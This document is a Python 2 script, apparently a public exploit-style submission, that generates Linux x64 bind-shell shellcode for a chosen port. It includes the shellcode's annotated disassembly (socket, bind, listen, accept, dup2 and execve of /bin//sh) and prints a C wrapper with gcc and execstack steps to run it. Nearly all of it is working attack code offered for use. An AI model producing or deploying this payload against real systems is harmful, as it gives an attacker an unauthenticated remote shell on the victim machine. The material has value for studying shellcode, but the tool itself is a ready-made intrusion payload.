#!/bin/python
import socket
import sys
"""

Linux x64 - Bind Shell shellcode Generator

---------------------------------------------------------------------------------

Disassemby of bindshell - port 5600

Disassembly of section .text:0000000000400080 <.text>:
  400080: 48 31 c0              xor    %rax,%rax
  400083: 48 31 f6              xor    %rsi,%rsi
  400086: 99                    cltd
  400087: 6a 29                 pushq  $0x29
  400089: 58                    pop    %rax
  40008a: ff c6                 inc    %esi
  40008c: 6a 02                 pushq  $0x2
  40008e: 5f                    pop    %rdi
  40008f: 0f 05                 syscall
  400091: 48 97                 xchg   %rax,%rdi
  400093: 6a 02                 pushq  $0x2
  400095: 66 c7 44 24 02 15 e0  movw   $0xe015,0x2(%rsp)	;;;; 0xe015 - Port of 5600
  40009c: 54                    push   %rsp
  40009d: 5e                    pop    %rsi
  40009e: 52                    push   %rdx
  40009f: 6a 10                 pushq  $0x10
  4000a1: 5a                    pop    %rdx
  4000a2: 6a 31                 pushq  $0x31
  4000a4: 58                    pop    %rax
  4000a5: 0f 05                 syscall
  4000a7: 50                    push   %rax
  4000a8: 5e                    pop    %rsi
  4000a9: 6a 32                 pushq  $0x32
  4000ab: 58                    pop    %rax
  4000ac: 0f 05                 syscall
  4000ae: 6a 2b                 pushq  $0x2b
  4000b0: 58                    pop    %rax
  4000b1: 0f 05                 syscall
  4000b3: 48 97                 xchg   %rax,%rdi
  4000b5: 6a 03                 pushq  $0x3
  4000b7: 5e                    pop    %rsi
  4000b8: ff ce                 dec    %esi
  4000ba: b0 21                 mov    $0x21,%al
  4000bc: 0f 05                 syscall
  4000be: 75 f8                 jne    0x4000b8
  4000c0: 48 31 c0              xor    %rax,%rax
  4000c3: 99                    cltd
  4000c4: 48 bb 2f 62 69 6e 2f  movabs $0x68732f2f6e69622f,%rbx
  4000cb: 2f 73 68
  4000ce: 53                    push   %rbx
  4000cf: 54                    push   %rsp
  4000d0: 5f                    pop    %rdi
  4000d1: 6a 3b                 pushq  $0x3b
  4000d3: 58                    pop    %rax
  4000d4: 0f 05                 syscall
 ---------------------------------------------------------------------------------
 b4ck 2 h4ck --- Ajith Kp [@ajithkp560] --- http://www.terminalcoders.blogspot.com

 Om Asato Maa Sad-Gamaya |
 Tamaso Maa Jyotir-Gamaya |
 Mrtyor-Maa Amrtam Gamaya |
 Om Shaantih Shaantih Shaantih |
"""
bann3r = '''
	[][][][][][][][][][][][][][][][][][][][][][][]
	[]                                          []
	[]      c0d3d by Ajith Kp [ajithkp560]      []
	[]   http://www.terminalcoders.blogspot.in  []
	[]                                          []
	[][][][][][][][][][][][][][][][][][][][][][][]
'''
print bann3r
usage = "Usage: "+sys.argv[0]+" <port number (501<= port <= 9997)>"
example = "Example: "+sys.argv[0]+" 5600"
code1 = "\\x48\\x31\\xc0\\x48\\x31\\xf6\\x99\\x6a\\x29\\x58\\xff\\xc6\\x6a\\x02\\x5f\\x0f\\x05\\x48\\x97\\x6a\\x02\\x66\\xc7\\x44\\x24\\x02"
code2 = "\\x54\\x5e\\x52\\x6a\\x10\\x5a\\x6a\\x31\\x58\\x0f\\x05\\x50\\x5e\\x6a\\x32\\x58\\x0f\\x05\\x6a\\x2b\\x58\\x0f\\x05\\x48\\x97\\x6a\\x03\\x5e\\xff\\xce\\xb0\\x21\\x0f\\x05\\x75\\xf8\\x48\\x31\\xc0\\x99\\x48\\xbb\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x53\\x54\\x5f\\x6a\\x3b\\x58\\x0f\\x05"
if len(sys.argv)!=2:
	print usage
	print example
else:
	port = "\\x"+("\\x").join([''.join(x) for x in zip(*[list(str(hex(socket.htons(int(sys.argv[1])))[2:])[z::2]) for z in range(2)])][::-1])#str(hex(socket.htons(int(sys.argv[1])))[2:])
	sh311code = code1 + port + code2
	print '// Port = '+sys.argv[0]+' --- (501<= port <= 9997)'
	print '// Compile with'
	print '// $ gcc -o output source.c'
	print '// $ execstack -s output'
	print '// $ ./output'
	print '// $ ./output'
	print '////////////////////////////////////////////\n'
	print '# include <stdio.h>'
	print 'char sh[] = "'+sh311code+'";'
	print 'main(int argc, char **argv)'
	print '''{
            int (*func)();
            func = (int (*)()) sh;
            (int)(*func)();'''
	print '}'
	print '\n////////////////////////////////////////////'